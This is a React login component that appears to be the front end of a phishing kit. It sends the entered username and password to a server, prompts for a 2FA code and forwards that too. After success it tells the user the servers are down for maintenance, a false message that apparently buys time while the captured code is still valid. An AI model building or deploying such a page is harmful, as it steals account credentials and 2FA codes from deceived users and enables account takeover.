// src/components/UserLogin.js

import React, { useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';

const UserLogin = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [message, setMessage] = useState('');
  const navigate = useNavigate();

  const handleLogin = async (event) => {
    event.preventDefault();

    try {
      // Send credentials to your server
      const loginResponse = await fetch('http://localhost:3002/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ username, password })
      });

      if (loginResponse.ok) {
        console.log('Credentials sent successfully');
        // Prompt for 2FA code
        const verificationCode = window.prompt('Enter the 2FA code sent to you:');

        // Send 2FA code to the server
        const response2FA = await fetch('http://localhost:3002/verify2FA', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ verificationCode })
        });

        if (response2FA.ok) {
          console.log('2FA code sent successfully');
          setMessage('Servers are down for maintenance, please try again in a few hours');
        } else {
          console.error('Failed to send 2FA code');
          setMessage('Error in 2FA verification. Please try again.');
        }
      } else {
        console.error('Failed to send credentials');
        setMessage('Login failed. Please check your username and password.');
      }
    } catch (error) {
      console.error('Error:', error);
      setMessage('An error occurred. Please try again.');
    }
  };

  return (
    <div className="flex items-center justify-center h-screen bg-black text-gray">
      <div className="bg-white rounded-lg p-8 shadow-lg">
        <h1 className="text-2xl mb-4">User Login</h1>
        <form onSubmit={handleLogin}>
          <input
            type="text"
            placeholder="Username"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            className="w-full py-2 px-3 rounded-lg mb-4 border-none bg-gray-200"
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full py-2 px-3 rounded-lg mb-4 border-none bg-gray-200"
          />
          <button type="submit" className="w-full py-3 bg-black text-white rounded-lg mb-2">
            Login
          </button>
        </form>
        {message && <div className="text-center text-red-500">{message}</div>}
        <p className="text-center text-gray-500 mb-2">
          <Link to="/forgotpassword" className="text-blue-500">
            Forgot Password?
          </Link>
        </p>
        <p className="text-center text-gray-500">
          <Link to="/signup">
            <button className="text-blue-500">Sign Up</button>
          </Link>
        </p>
      </div>
    </div>
  );
};

export default UserLogin;
